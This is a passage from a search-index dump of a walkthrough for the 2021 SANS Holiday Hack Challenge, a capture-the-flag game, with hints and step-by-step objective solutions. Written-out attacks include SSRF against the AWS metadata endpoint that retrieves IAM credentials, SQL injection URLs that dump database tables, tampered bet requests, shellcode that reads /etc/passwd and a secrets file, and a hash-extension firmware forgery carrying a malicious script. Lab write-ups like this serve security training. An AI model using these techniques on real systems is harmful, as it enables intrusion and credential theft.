discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code. Hint 1 Link FPGA enthusiast sites : Link a lesson : Link Grody Golterson's Hint Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ?? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Objective Hints"},{"location":"talks/","text":"KringleCon Talks \u00b6 Talk Speaker Notes SANS Holiday Hack Challenge: Welcome + Orientation Ed Skoudis Automate security response by creating your own \"Naughty Lists\" Andy Smith RFC-3514 Compliant Pentesting: Being Good While You're Being Bad Tom Liston FPGA Design for Embedded Systems Prof. Qwerty Petabyte Disclosing Security Vulnerabilities to OS Projects.. Like a Boss! Nancy Garich\u00e9 Kubernetes Attack Demo: Hacking a Cheating Casino Jay Beale The Abominable Snowman's Threat Hunting Adventure Xena Olsen A CISO's Best Friend: The Pentester!!?! Sean Atkinson & Chris Elgee How to Build a Free Malware Lab Mary Ellen Kennel Using Open-Source Tools to Track Elves Clay Moody HIDden Duckey, Deconstructed Payload Kevin Tyers Google, Eliminating XSS in Angular Applications Bjarki \u00c1g\u00fast Gu\u00f0mundsson Log4j Vulnerability Response Prof. Qwerty Petabyte","title":"Talks"},{"location":"talks/#kringlecon-talks","text":"Talk Speaker Notes SANS Holiday Hack Challenge: Welcome + Orientation Ed Skoudis Automate security response by creating your own \"Naughty Lists\" Andy Smith RFC-3514 Compliant Pentesting: Being Good While You're Being Bad Tom Liston FPGA Design for Embedded Systems Prof. Qwerty Petabyte Disclosing Security Vulnerabilities to OS Projects.. Like a Boss! Nancy Garich\u00e9 Kubernetes Attack Demo: Hacking a Cheating Casino Jay Beale The Abominable Snowman's Threat Hunting Adventure Xena Olsen A CISO's Best Friend: The Pentester!!?! Sean Atkinson & Chris Elgee How to Build a Free Malware Lab Mary Ellen Kennel Using Open-Source Tools to Track Elves Clay Moody HIDden Duckey, Deconstructed Payload Kevin Tyers Google, Eliminating XSS in Angular Applications Bjarki \u00c1g\u00fast Gu\u00f0mundsson Log4j Vulnerability Response Prof. Qwerty Petabyte","title":"KringleCon Talks"},{"location":"thints/","text":"Hints \u00b6 This page will provide various hints that were provided by the game for terminal challenges. Terminal Hints \u00b6 Terminals 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 No hints. No hints. Hint 1 Link this : Link Hint 2 Press h in the console for hints. Hint 1 Link This : Link Hint 2 Link This one : Link Hint 1 Link this GitHub Gist : Link No hints. No hints. KringleCon Talk Andy Smith, Automate security response by creating your own \"Naughty Lists\" | KringleCon 2021 No hints. Hint 1 Run hint in the terminal for assistance. No hints. Hint 1 Link This : Link Hint 1 Link a lesson : Link Hint 2 Link simple checker script : Link Hint 3 Link Apache Foundation : Link Hint 1 Link a discussion : Link Hint 2 Link help document : Link","title":"Terminals"},{"location":"thints/#hints","text":"This page will provide various hints that were provided by the game for terminal challenges.","title":"Hints"},{"location":"thints/#terminal-hints","text":"Terminals 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 No hints. No hints. Hint 1 Link this : Link Hint 2 Press h in the console for hints. Hint 1 Link This : Link Hint 2 Link This one : Link Hint 1 Link this GitHub Gist : Link No hints. No hints. KringleCon Talk Andy Smith, Automate security response by creating your own \"Naughty Lists\" | KringleCon 2021 No hints. Hint 1 Run hint in the terminal for assistance. No hints. Hint 1 Link This : Link Hint 1 Link a lesson : Link Hint 2 Link simple checker script : Link Hint 3 Link Apache Foundation : Link Hint 1 Link a discussion : Link Hint 2 Link help document : Link","title":"Terminal Hints"},{"location":"posts/Objectives/%21template/","text":"#) \u00b6 Objective \u00b6 Details Location : KringoleCon/Kitchen Elf : Objective Link 1 : Elf's Objective Message Walk-through \u00b6 The terminal challenge for this objective is the terminal \"Exif Metadata\" offered by Piney Sappington. Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective click on the \"Santa Shop\". A console will popup, which allows you to download an offline version of the Point-of-Sale software to inspect.","title":")"},{"location":"posts/Objectives/%21template/#_1","text":"","title":"#)"},{"location":"posts/Objectives/%21template/#objective","text":"Details Location : KringoleCon/Kitchen Elf : Objective Link 1 : Elf's Objective Message","title":"Objective"},{"location":"posts/Objectives/%21template/#walk-through","text":"The terminal challenge for this objective is the terminal \"Exif Metadata\" offered by Piney Sappington. Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective click on the \"Santa Shop\". A console will popup, which allows you to download an offline version of the Point-of-Sale software to inspect.","title":"Walk-through"},{"location":"posts/Objectives/Objective1/","text":"Objective Walk-through Details Location : North Pole/Orientation Elf : Jingle Ringford Elf's Objective Message Welcome to the North Pole, KringleCon, and the 2021 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks. First things first, here's your badge! It's that wrapped present in the middle of your avatar. Great - now you're official! Click on the badge on your avatar \ud83c\udf81. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that USB wifi adapter - just in case you need it later. Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions. Left click on Jingle Ringford to interact and solve these objectives. She will give you your badge and wifi adapter. She will give you an introduction about terminals. You will need to click on the Cranberry Pi Terminal and type answer in the terminal to solve objective 1d).","title":"1) KringleCon Orientation"},{"location":"posts/Objectives/Objective10/","text":"Objective Walk-through Details Objective Link 1 : Link github files : Link The terminal challenge for this objective is the terminal \"IMDS Exploration\" offered by Noxious O. D'or. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the Jack Frost Tower job applications server in the objective menu. Click Apply on the main page. You will be taken to the application page. The Apply page has a field called \"URL to your public NLBI report\". This field is vulnerable to SSRF. In the field you will be putting a AWS IMDS query. The query will be ran by the server. The server will be returning the result in a jpeg file. The first IMDS query to send is http://169.254.169.254/latest/meta-data/ . Put this url in the above field, add a name to the name field and submit the application. The server will return the results in a jpeg file. This file can be viewed in Firefox Developer tools under network. Opening this jpeg file reveals the response from the server. From the above results we can see available credentials for jf-deploy-role . Lets request the credentials via the IMDS query http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role . The server returns the following results in the jpeg file: { \"Code\" : \"Success\" , \"LastUpdated\" : \"2021-05-02T18:50:40Z\" , \"Type\" : \"AWS-HMAC\" , \"AccessKeyId\" : \"AKIA5HMBSK1SYXYTOXX6\" , \"SecretAccessKey\" : \"CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX\" , \"Token\" : \"NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==\" , \"Expiration\" : \"2026-05-02T18:50:40Z\" } Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX","title":"10) Now Hiring!"},{"location":"posts/Objectives/Objective11/","text":"Objective Walk-through Details Objective Link 1 : Link github files : Link The terminal challenge for this objective is the terminal \"Strace Ltrace Retrace\" offered by Tinsel Upatree. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective download the jackfrosttower-network.zip available in the objective menu. You will need Wireshark or a network packet reader. From the hints, we know that Jack Frost Tower sets the evil bit from FRC791 for their communication. RFC791 To solve this problem, we define a security flag, known as the \"evil\" bit, in the IPv4 [RFC791] header. Benign packets have this bit set to 0; those that are used for an attack will have the bit set to 1. The evil bit can be filtered in Wireshark by ip.flags.rb . Load the provided Jack Frost Tower network capture into Wireshark. In the filter field type ip.flags.rb != 1 . This will filter out all the packets that have the evil bit set. The result shows a HTTP POST request that does not have the evil bit set: Opening this packet(# 384) shows the following: The POST request is a complaint from the Elf Muffy Sebastian VonDuchess in Room 1024 . To search for complaints for room 1024 , clear existing filters and add urlencoded-form.value contains \"1024\" . This filter will search for 1024 in the POST request. The result are 3 packets (384,312, 276): Packet 384 Packet 312 Packet 276 From the above packets you see the three trolls that complained were Flud Hagg Yaqh. Answer Flud Hagg Yaqh","title":"11) Customer Complaint Analysis"},{"location":"posts/Objectives/Objective12/","text":"Objective Walk-through Details Location : FrostFest/Jack's Studio Troll : Ingreta Tude Objective Link 1 : Link Objective Link 2 : Link github files : Link Troll's Objective Message Hey there! I\u2019m Ingreta Tude. I really don\u2019t like the direction Jack Frost is leading us. He seems obsessed with beating Santa and taking over the holiday season. It just doesn\u2019t seem right. Why can\u2019t we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We\u2019re getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it\u2019s secure. My sister, Ruby Cyster, created this site, and I don\u2019t trust the results. Can you please take a look at it to find flaws? Here is the source code if you need it. Oh wow - I thought we left SQL injection in the last decade. Thanks for your help finding this! The terminal challenge for this objective is the terminal \"Elf Code Python\" offered by Ribb Bonbowford. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the \"Frost Tower Website Checkup\" terminal next to Ingreta Tude. This will open up this website . After openning the above website, open the Firefox developer tools and go to the Network tab. On the website, type in a random email address in the subscribe field and press submit. The Developers tool shows the HTTP header for this request: The response is coming from the site https://staging.jackfrosttower.com/testsite . By reviewing the source code for Frost Tower Website you can find login bypass and SQL injection (SQLi) vulnerablities. The vulnerabilty for the login bypass can be found in the /postcontact endpoint: To verify authentication, the website endpoints check for a session.unqiueID . The /postcontact endpoint (or contact form) sets the session.uniqueID if an email address was already submitted. To bypass the authentication you need to submit the same email address twice in the contact form. Open the above website in Firefox, https://staging.jackfrosttower.com/testsite . Click the contact link on top right. Enter and save the same email address twice to bypass the login. Click on the dashboard to view the dashboard. The SQL injection vulnerability is found in the /detail/:id endpoint. The 'm.raw' command is preventing the .escape() function from working properly. You can take advantage of the SQLi vulnerabilty by requesting details for multiple contacts (ex. https://staging.jackfrosttower.com/detail/199,200,201 ). Now instead of the multiple contact IDs (199,200,201), we will be sending a SQLi. The SQLi URL looks as follow: SQLi URL https://staging.jackfrosttower.com/detail/199%20union [SQL Ruquest]--, To get a list of all users by SQLi, visit the following website: SQLi to get all users https://staging.jackfrosttower.com/detail/199%20union select * from users --, We can't send comma's in the SQLi request. To find all the table names you will need to replace the commas with a longer expression. Run the following SQLi to get all the table names: SQLi to get all the table names https://staging.jackfrosttower.com/detail/199%20union select * from ((select 9999)A join (select table_name from information_schema.tables)B join (select null)C join (select null)D join (select null)E join (select null)F join (select null)G) --, From the results of the above SQLi you see there is a table called todo . Run the following SQLi three times with offset 0,1,2 to get the three column IDs: SQLi to get column names for todo table https://staging.jackfrosttower.com/detail/199%20union select * from ((select 9999)A join (SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'todo' ORDER BY ordinal_position LIMIT 1 offset 2)B join (select null)C join (select null)D join (select null)E join (select null)F join (select null)G) --, From the results of the above SQLi you see the table todo has three columns id , note , completed . Run the following SQLi to get the todo table: SQLi to get the three columns of todo table https://staging.jackfrosttower.com/detail/199%20union select * from ((select% 9999)A join (SELECT note FROM todo)B join (select completed from todo)C join (select id from todo)D join (select null)E join (select null)F join (select null)G) --, From the results of the above SQLi you see one of the notes that says: With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him Answer clerk","title":"12) Frost Tower Website Checkup"},{"location":"posts/Objectives/Objective13/","text":"Objective Walk-through Details Location : FrostFest/Frost Tower Rooftop Troll : Crunchy Squishter Troll's Objective Message Greetings Earthling! I'm Crunchy Squishter. Hey, could you help me get this device on the table working? We've cobbled it together with primitive parts we've found on your home planet. We need an FPGA though - and someone who knows how to program them. If you haven't talked with Grody Goiterson by the Frostavator, you might get some FPGA tips there. Thank you! Now we're able to communicate with the rest of our people! The terminal challenge for this objective is the terminal \"Frostavator\" offered by Gordy Goiterson. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the \"FPGA programming\" next to Crunchy Squishter. From the conference video for this objective, you know that you need to divide freq 100 to get the actual frequency: Also, to create the desired frequency square wave (freq), you would need to switch the output waveform twice per cycle. This means you need a timer that goes 2 x (freq) value. Taking into account the decimals and the input clock, you will need to switch output wave every 125MHZ/ (2 x * (freq/100)) count. In the code below this is called increment . The other thing you need to take into account is the fact that it takes 0.5 clock cycle for the FPGA to reset. To build an accurate Square Wave generator you need to take this into account. For this we actually count by 0.5 counts on every positive and negative clock edges. When the FPGA is reset, we set the counter to 0.5 to account for the reset. Putting everything you get the following FPGA code to create square waves at requested frequency. // Note : For this lab , we will be working with QRP Corporation 's CQC-11 FPGA. // The CQC - 11 operates with a 125 MHz clock . // Your design for a tone generator must support the following // inputs / outputs : // ( NOTE : DO NOT CHANGE THE NAMES . OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES ! ) // input clk - this will be connected to the 125 MHz system clock // input rst - this will be connected to the system board 's reset bus // input freq - a 32 bit integer indicating the required frequency // ( 0 - 9999.99 Hz ) formatted as follows : // 32 'hf1206 or 32' d987654 = 9876.54 Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need , but remember // to initialize them to something ! ` timescale 1 ns / 1 ns module tone_generator ( input clk , input rst , input [ 31 : 0 ] freq , output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO : Add your code below . // Remove the following line and add your own implementation . // Note : It 's silly, but it compiles... reg wavey ; assign wave_out = wavey ; real counter ; real increment = 125000000 / ( freq * 2 / 100 ); always @ ( edge clk or negedge rst ) begin if ( rst == 1 ) begin counter <= 0.5 ; wavey <= 0 ; end else begin if ( counter >= increment ) begin counter <= 0 ; wavey <= wavey ^ 1 'b1; end else counter <= counter + 0.5 ; end end endmodule Copy and paste the above code and simulate 500Hz, 1KHz, 2KHz, and random frequency. Once you complete this objective you will be given a FPGA item. You will need to plug the FPGA into the Speak &c Spell next to Crunchy Squishter. After this a spaceship appears which leads to the ending of the game. Santa tells you The Frostians have reached out to me via video link. They\u2019ve explained to me all that has happened. I\u2019d like to thank you for your truly excellent work in foiling Jack\u2019s plans and ensuring that he is finally brought to justice. On behalf of all of us here at the North Pole, we wish you and yours a happy and healthy Holiday Season. Thank you and HAPPY HOLIDAYS from me and all of the elves. Ho Ho Ho! Answer // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1ns/1ns module tone_generator ( input clk, input rst, input [31:0] freq, output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. // Remove the following line and add your own implementation. // Note: It's silly, but it compiles... reg wavey; assign wave_out = wavey; real counter; real increment = 125000000 / (freq*2/100); always @(edge clk or negedge rst) begin if (rst==1) begin counter <=0.5; wavey <=0; end else begin if(counter >= increment) begin counter <= 0; wavey <= wavey ^ 1'b1; end else counter <= counter + 0.5; end end endmodule","title":"13) FPGA Programming"},{"location":"posts/Objectives/Objective2/","text":"Objective Walk-through Details Location : KringoleCon/Courtyard Elf : Tangle Coalbox Elf's Objective Message Hey there, Gumshoe. Tangle Coalbox here again. I've got a real doozy of a case for you this year. Turns out some elves have gone on some misdirected journeys around the globe. It seems that someone is messing with their travel plans. We could sure use your open source intelligence (OSINT) skills to find them. Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe. If you're having any trouble with it, you might ask Piney Sappington right over there for tips. The terminal challenge for this objective is the terminal \"Exif Metadata\" offered by Piney Sappington. Solving this terminal challenge provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective click on the \"Caramel Santaigo\" terminal or click the link . Open the developer tools for your browser and copy the cookies for this application. Copy the cookie from above and use CyberChef to decode the cookie. Remove the '.' from beginning of the cookie. Decoding Base64 Cookies Visit Cyber Chef : Put the Cookie Base64 string in the Input field Drag From Base64 and Zlib Inflate operations into the Recipe Set the From Base64 setting to alphabet to URL safe Bake and poof! The decoded cookie will look like this: { \"day\" : \"Monday\" , \"elf\" : \"Eve Snowshoes\" , \"elfHints\" :[ \"They kept checking their Twitter app.\" , \"Oh, I noticed they had a Doctor Who themed phone case.\" , \"The elf mentioned something about Stack Overflow and Rust.\" , \"The elf got really heated about using spaces for indents.\" , \"hard\" ], \"hour\" : 9 , \"location\" : \"Santa's Castle\" , \"options\" :[[ \"Copenhagen, Denmark\" , \"Antwerp, Belgium\" , \"Tokyo, Japan\" ],[ \"Vienna, Austria\" , \"Antwerp, Belgium\" , \"Reykjav\\u00edk, Iceland\" ],[ \"London, England\" , \"Prague, Czech Republic\" , \"Antwerp, Belgium\" ],[ \"Placeholder\" , \"Vienna, Austria\" , \"Edinburgh, Scotland\" ]], \"randomSeed\" : 480 , \"route\" :[ \"Antwerp, Belgium\" , \"Vienna, Austria\" , \"Prague, Czech Republic\" , \"Placeholder\" ], \"victoryToken\" : \"{ hash:\\\"8f76b2bd4d3f7248eb05d24499df4f6bc15158ebea8b68a34fdc3d0d43926124\\\", resourceId: \\\"107aae53-818c-4344-9a55-160479226b3d\\\"}\" } From above you can see the route is [\"Antwerp, Belgium\",\"Vienna, Austria\",\"Prague, Czech Republic\",\"Placeholder\"] . Click Depart by sleigh and Select Antwerp, Belgium . Click Depart by sleigh again and Select Vienna, Austria . Click Depart by sleigh one more time and Select Prague, Czech Republic . Now click on \"Visit InterRink\" and type the Elf Attributes based on the decoded cookie. For our example, it will look like the following: Click on Filter Elf and you will see Eve Snowshoes is the only match (which matches the cookie). Click on Investigate and Click Investigate 1. You get the following screen: Select the Elf name from the cookie or filter, in our case it was 'Eve Snowshoes', and press Guess Elf . You will be greeted with the victory message: Answer Eve Snowshoes in Prague, Czech Republic.","title":"2) Where in the World is Caramel Santaigo?"},{"location":"posts/Objectives/Objective3/","text":"Objective Walk-through Details Location : North Pole Troll : Grimy McTrollkins Item required : Wifi Dongle Troll's Objective Message Yo, I'm Grimy McTrollkins. I'm a troll and I work for the big guy over there: Jack Frost. I\u2019d rather not be bothered talking with you, but I\u2019m kind of in a bind and need your help. Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower! I wonder if you can help me get back in. I think we can melt the door open if we can just get access to the thermostat inside the building. That thermostat uses Wi-Fi. And I\u2019ll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole. Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to \u201cOpen Wi-Fi CLI.\u201d That\u2019ll give you command-line interface access to your badge\u2019s wireless capabilities. The terminal challenge for this objective is the \"Grepping for Gold\" terminal offered by Greasy GopherGuts. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective you need to stand next to the WIFI adapter that is mounted on the Frost Tower in North Pole. Open the Wifi Dongle CLI from your Badge Item List when standing next to the WIFI adapter. Scan for available Wifi Networks with the command: iwlist wlan0 scan Connect to FROST-Nidus-Setup wifi network by using the command: iwconfig wlan0 essid FROST-Nidus-Setup After successfully connecting you will have access to Nidus Termostat Setup page. You can view the api commands using the command curl http://nidus-setup:8080/apidoc . You can view the cooler settings using the curl -XGET http://nidus-setup:8080/api/cooler . To defrost the door use the following command to set the temperature to 20 and humidity, wind, and wind chill to 0. Answer curl -XPOST -H 'Content-Type: application/json' --data-binary '{ \"temperature\": 20, \"humidity\": 0, \"wind\":0, \"windchill\": 0}' http://nidus-setup:8080/api/cooler","title":"3) Thaw Frost Tower's Entrance"},{"location":"posts/Objectives/Objective4/","text":"Objective Walk-through Details Location : FrostFest/Frost Tower Lobby Objective Link 1 : link Required : Burp or Firefox The terminal challenge for this objective is the \"Logic Muchers\" terminal offered by Noel Boetie. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective open ' https://slots.jackfrosttower.com/ ' in Firefox and press play. Open Firefox developer tools by pressing Ctrl-Shift-i and navigate to the 'Network' tab. When you press spin, the game sends a POST request to the game server. You can see this in Firefox Developer tool's Network tab. This body of this request contains the following: betamount = 1 & numline = 20 & cpl = 0.1 Note betamount is the bet level. cpl is the bet size. You can POST a negative bet size (cpl) to increase your balance when you lose. In Firefox developer tools click edit and resend (under the Network Tab). Change the body to the following: betamount = 10 & numline = 20 & cpl =- 0.5 Keep re-sending the above request to the server. You will see your credit increase. As your balance increases and gets close to 1000 the server will send you the following response: Answer I'm going to have some bouncer trolls bounce you right out of this casino!","title":"4) Slot Machine Investigation"},{"location":"posts/Objectives/Objective5/","text":"Objective Walk-through Details Location : KringoleCon/Speaker UNPreparedness Room Elf : Morcel Nougat Elf's Objective Message Hello and welcome to the speaker _Un_Preparedness Room! I'm Morcel Nougat, elf extraordinaire. I've heard the talks at the other con across the way are a bit... off. I really don't think they have the right sense about what makes for a wonderful holiday season. But, anyway! Say, do you know anything about USB Rubber Duckies? I've been playing around with them a bit myself. Please see what you can do to help solve the Rubber Ducky Objective! Oh, and if you need help, I hear Jewel Loggins, on this floor outside this room, has some experience. The terminal challenge for this objective is the \"IPv6 Sandbox\" terminal offered by Jewel Loggins. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective talk to Morcel Nougat and open the Strange USB Device terminal. The USB data is located in /mnt/USBDEVICE . Use mallard.py script to reverse engineer and decode the rubber ducky binary file. ./mallard.py -f /mnt/USBDEVICE/inject.bin On bottom of the results from this command you will see a BASE64 string. Copy and paste this BASE64 string without the | bash section. Remove the String from the beginning of the command. Run it in the terminal. It should look like this: From the above output you can see the following user's SSH public key is being added to ~/.ssh/authorized_keys . Answer ickymcgoop","title":"5) Strange USB Device"},{"location":"posts/Objectives/Objective6/","text":"Objective Walk-through Details Location : FrostFest/Jack's Office Elf : Ruby Cyster Objective Link 1 : Link Troll's Objective Message Hey, I'm Ruby Cyster. Don't listen to anything my sister, Ingreta, says about me. So I'm looking at this system, and it has me a little bit worried. If I didn't know better, I'd say someone here is learning how to hack North Pole systems. Who's got that kind of nerve! Anyway, I hear some elf on the other roof knows a bit about this type of thing. Oh man - what is this all about? Great work though. So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing! The terminal challenge for this objective is the \"Holiday Hero\" terminal offered by Chimney Scissorsticks. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the \"Shellcode Primer\" next to Ruby Cryster. There are 11 modules for this challenge. Follow the instructions and hints if you need to figure out each module. The code for each module is displayed below: 1 2 3 4 5 6 7 8 9 10 11 ; Set up some registers (sorta like variables) with values ; In the debugger, look how these change! mov rax , 0 mov rbx , 1 mov rcx , 2 mov rdx , 3 mov rsi , 4 mov rdi , 5 mov rbp , 6 ; Push and pop - watch how the stack changes! push 0x12345678 pop rax push 0x1111 push 0x2222 push 0x3333 pop rax pop rax pop rax ; This creates a string and references it in rax - watch the debugger! call getstring db \" Hello World ! \" , 0 getstring: pop rax ; Finally, return 0x1337 mov rax , 0x1337 ret ; We want to loop 5 times - you can change this if you want! mov rax , 5 ; Top of the loop top: ; Decrement rax dec rax ; Jump back to the top until rax is zero jnz top ; Cleanly return after the loop ret ret ; TODO: Set rax to 1337 mov rax , 1337 ; Return, just like we did last time ret ; TODO: Find the syscall number for sys_exit and put it in rax mov rax , 60 ; TODO: Put the exit_code we want (99) in rdi mov rdi , 99 ; Perform the actual syscall syscall ; Push this value to the stack push 0x12345678 ; Try to return ret ; Remember, this call pushes the return address to the stack call place_below_the_nop ; This is where the function *thinks* it is supposed to return nop ; This is a 'label' - as far as the call knows, this is the start of a function place_below_the_nop: ; TODO: Pop the top of the stack into rax pop rax ; Return from our code, as in previous levels ret ; This would be a good place for a call call place_below_hello_world ; This is the literal string 'Hello World', null terminated, as code. Except ; it'll crash if it actually tries to run, so we'd better jump over it! db ' Hello World ' , 0 ; This would be a good place for a label and a pop place_below_hello_world: pop rax ; This would be a good place for a re... oh wait, it's already here. Hooray! Ret ; TODO: Get a reference to this string into the correct register call getstring db \" Hello World ! \" , 0 getstring: pop rbx ; Set up a call to sys_write ; TODO: Set rax to the correct syscall number for sys_write mov rax , 0x1 ; TODO: Set rdi to the first argument (the file descriptor, 1) mov rdi , 0x1 ; TODO: Set rsi to the second argument (buf - this is the \"Hello World\" string) mov rsi , rbx ; TODO: Set rdx to the third argument (length of the string, in bytes) mov rdx , 0xC ; put length in rdx ; Perform the syscall syscall ; Return cleanly ret ; TODO: Get a reference to this string into the correct register call getstring db '/ etc / passwd ' , 0 getstring: pop rbx ; Set up a call to sys_open ; TODO: Set rax to the correct syscall number mov rax , 0x2 ; TODO: Set rdi to the first argument (the filename) mov rdi , rbx ; TODO: Set rsi to the second argument (flags - 0 is fine) mov rsi , 0 ; TODO: Set rdx to the third argument (mode - 0 is also fine) mov rdx , 0 ; Perform the syscall syscall ; syscall sets rax to the file handle, so to return the file handle we don't ; need to do anything else! ret ; TODO: Get a reference to this call bottom db '/ var / northpolesecrets.txt ' , 0 bottom: ; TODO: Call sys_open mov rax , 2 ; syscall (sys_open) pop rdi ; filename mov rsi , 0 mov rdx , 0 syscall ; TODO: Call sys_read on the file handle and read it into rsp mov rdi , rax ; handle mov rax , 0 ; syscall (sys_read) mov rsi , rsp ; buffer mov rdx , 138 ; length syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) mov rdx , rax ; length mov rax , 1 ; syscall (sys_read) mov rdi , 1 ; handle (stdout) mov rsi , rsp ; buffer syscall ; TODO: Call sys_exit mov rax , 60 mov rdi , 0 syscall The last challenge will print out the content of the file /var/northpolesecrets.txt . You get the following output from running the challenge: Answer cyber security knowledge","title":"6) Shellcode Primer"},{"location":"posts/Objectives/Objective7/","text":"Objective Walk-through Details Location : FrostFest/Jack's Office Objective Link 1 : Link github files : Link The terminal challenge for this objective is the terminal \"Shellcode Primer\" offered by Ruby Cyster. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the \"Printer Exploitation\" terminal in Jack's Office. Click on Firmware Update and Download current firmware ( Download Link ). The downloaded firmware is called firmware-export.json . The content of the firmware is shown below: firmware-export.json firmware : firmware BASE64 blob Secret_length : 16 Algorithm : SHA256 Signature : 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 Copy and paste the firmware BASE64 blob to a new text file, firmware.b64 . Use the following command to decode the BASE64 file: base64 -d firmware.b64 > file . Using the command file file will display that the decoded BASE64 blob is a Zip archive. Rename this file to firmware.zip and make a copy of it, new_firmware.zip by running the following commands: mv ./file ./firmware.zip cp ./firmware.zip ./new_firmware.zip The file firmware.zip contains a file called firmware.bin (which is a ELF binary). Create a new script file and call it firmware.bin . This script should contain the following: #!/bin/bash cp /var/spool/printer.log /app/lib/public/incoming/ Make the firmware.bin executable by running chmod +x firmware.bin . This script copies the file /var/spool/printer.log to /app/lib/public/incoming/ folder. This will allow you to download printer.log through the URL https://printer.kringlecastle.com/incoming/printer.log . Add the new firmware.bin script to the new_firmware.zip overwriting the old firmware.bin . At this point, you should have the original firmware.zip and new_firmware.zip which contains the firmware.bin script. Also from firmware-export.json , we know the Secret_length , Algorithm , and Signature for the original firmware.bin . Now need to use Hash Extension Attacks to append new_firmware.zip to firmware.zip and generate a valid signature. Did you know? If you append multiple zip files the last one is processed by the printer? Download and install Hash Extender using the following commands: git clone https://github.com/iagox86/hash_extender.git apt-get install libssl-dev cd hash_extender make Run the following hash_extender command to generate a valid signature: ./hash_extender --file = firmware.zip --signature = 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --format = sha256 --append = \" $( <new_firmware.zip ) \" --append-format = raw --out-data-format = hex --secret = 16 Part of the output is shown below: The new valid SHA256 signature is b6d2827df7c289461f7d0a52261a6fece598f6adae520e0ea61295fba022e668 . Copy the HEX output from hash_extender and paste it to cyberchef . Convert the HEX to BASE64 in cyberchef. Create new-firmware-export.json file that includes the BASE64 blob from cyberchef as the firmware , the new valid Signature , Secret_length , and Algorithm . On the printer Website, update the firmware using the newly created new-firmware-export.json . This file has a valid firmware signature and contains a bash script that will copy printer.log to the incoming folder that can be accessed through https://printer.kringlecastle.com/incoming/printer.log . After a few minutes visit https://printer.kringlecastle.com/incoming/printer.log . The content of the printer.log file is as follow: Documents queued for printing ============================= Biggering.pdf Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf LowEarthOrbitFreqUsage.txt Best Winter Songs Ever List.doc Win People and Influence Friends.pdf Q4 Game Floor Earnings.xlsx Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml Troll_Pay_Chart.xlsx Answer Troll_Pay_Chart.xlsx","title":"7) Printer Exploitation"},{"location":"posts/Objectives/Objective8/","text":"Objective Walk-through Details Objective Link 1 : Link github files : Link The terminal challenge for this objective is the terminal \"HoHo \u2026 No\" offered by Eve Snowshoes. Solving this terminal challenge provides additional hints for this 